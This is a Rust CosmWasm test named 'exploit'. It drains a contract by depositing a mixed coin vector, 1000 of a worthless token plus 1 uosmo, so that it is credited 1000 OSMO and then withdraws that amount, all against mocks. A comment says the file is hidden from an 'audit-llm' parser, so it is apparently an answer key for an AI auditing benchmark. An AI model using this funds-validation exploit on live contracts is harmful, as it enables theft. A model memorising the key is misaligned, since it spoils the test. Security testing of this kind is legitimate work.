### set up in separate file with separate ext so it doesn't get read by the audit-llm github repo parser

#[test]
fn exploit() {
    let mut deps = mock_dependencies_with_balance(&coins(2, "token"));

    let msg = InstantiateMsg {};
    let info = mock_info("creator", &coins(1000, "uosmo".to_string()));
    let _res = instantiate(deps.as_mut(), mock_env(), info, msg).unwrap();

    // we send a vector of coins to trick the system we deposited OSMO
    let malicious_funds: Vec<Coin> = vec![
        Coin {
            denom: "umyr".to_string(),
            amount: Uint128::from(1000_u64),
        },
        Coin {
            denom: "uosmo".to_string(),
            amount: Uint128::from(1_u64),
        },
    ];
    let info = mock_info("hacker", &malicious_funds);
    let msg = ExecuteMsg::Deposit {};
    let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();

    // verify hack succeeded
    let res = query(
        deps.as_ref(),
        mock_env(),
        QueryMsg::GetBalance {
            address: "hacker".to_string(),
        },
    )
    .unwrap();
    let value: BalanceResponse = from_binary(&res).unwrap();
    assert_eq!(Uint128::from(1000_u64), value.amount.amount);

    // withdraw funds
    let info = mock_info("hacker", &[]);
    let msg = ExecuteMsg::Withdraw {
        amount: Uint128::from(1000_u64),
    };
    let _res = execute(deps.as_mut(), mock_env(), info, msg).unwrap();
}